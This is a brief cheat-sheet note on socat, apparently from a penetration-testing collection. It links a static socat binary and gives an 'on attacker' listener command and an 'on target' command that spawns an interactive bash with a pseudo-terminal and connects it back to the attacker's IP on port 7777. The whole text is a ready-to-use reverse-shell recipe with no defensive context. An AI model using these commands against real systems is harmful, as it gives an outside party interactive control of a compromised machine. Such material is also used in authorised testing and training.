# Socat

Static binary:
https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat

On attacker:
```bash
socat file:`tty`,raw,echo=0 tcp-listen:7777
```

On target:
```bash
./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ip>:7777
```
